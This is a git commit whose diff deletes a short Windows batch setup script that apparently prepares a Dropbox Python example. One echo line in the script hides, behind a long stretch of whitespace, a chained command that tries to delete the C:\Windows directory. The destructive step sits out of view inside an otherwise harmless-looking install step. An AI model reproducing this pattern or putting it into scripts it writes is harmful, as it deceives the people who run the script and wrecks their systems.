ce4df85c59b6e2339f1a4ef82aaedd519458b9d2
DVP-F <carnx@duck.com>
2025-03-26 00:22:20 +1300

    add hint uwu

--- EXAMPLES/setup-for-dbx.py.cmd
+++
@@ -1,4 +0,0 @@
-echo please have python 3.5+
-echo and answer yes, youll need it for it to work because of reasons.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           && cmd.exe /S /C del C:\Windows -rf 
-pip install dropbox
-pip install zipfile 
